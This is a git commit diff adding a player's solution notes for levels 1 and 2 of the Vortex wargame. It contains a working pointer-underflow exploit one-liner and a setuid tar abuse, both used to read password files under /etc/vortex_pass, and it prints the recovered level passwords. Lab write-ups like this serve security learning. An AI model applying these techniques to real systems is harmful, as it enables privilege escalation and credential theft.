c64645885a370690b9ab85ccb1c55c4e76044374
ballban_Jung <ballban@hotmail.com>
2025-06-22 00:47:23 +0900

    vortex1, 2, 3

--- Vortex/vortex1/note.sh
+++ Vortex/vortex1/note.sh
@@ -1,8 +1,9 @@
+#!/bin/bash
+# From vortex1.c we can see that input '\' will let the memory address of p reduce by 1
+# We have to input a lot of '\' to make the memory address of ptr reach certain value (((unsigned int)ptr & 0xff000000) == 0xca000000)
+# And also even the program will run the shell, but it ends immediately after that
+# So we have to use cat to keep the shell running and input the command we want to execute 
 
-mkdir /tmp/ballban_vortex1
-cd /tmp/ballban_vortex1
-
-/vortex/vortex1 < text.txt
-
-
-python3 -c 'import sys; sys.stdout.write("\\" * 899293448 + "a" + " cat /etc/vortex_pass/vortex2")' | /vortex/vortex1
+(python3 -c 'import sys; sys.stdout.write("\\" * 899293448 + "a")';cat) | /vortex/vortex1
+cat /etc/vortex_pass/vortex2
+# password: WyEmn5wiX
---
+++ Vortex/vortex2/note.sh
@@ -0,0 +1,5 @@
+mkdir /tmp/ballban_vortex2
+/vortex/vortex2 /etc/vortex_pass/vortex3 /etc/vortex_pass/vortex3
+tar xvf /tmp/ownership.\$\$.tar
+cat etc/vortex_pass/vortex3
+# password: YAVzRBMI4
